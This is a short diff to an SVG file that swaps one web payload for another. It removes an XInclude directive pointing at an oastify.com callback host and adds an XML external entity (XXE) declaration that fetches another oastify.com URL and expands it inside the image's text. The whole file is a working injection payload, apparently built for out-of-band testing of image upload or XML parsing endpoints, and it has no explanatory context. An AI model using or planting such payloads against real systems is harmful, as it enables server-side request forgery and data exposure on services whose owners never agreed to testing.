@@ -1,4 +1,7 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude" width="200" height="200">
-  <xi:include href="http://gxh7gxpzdt68d2ws3z8vmbzhs8yymn.oastify.com/xinclude" parse="text"/>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://qf91fm86shpqps66n6wqb7sbc2ix6nuc.oastify.com">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text x="10" y="20">&xxe;</text>
 </svg>
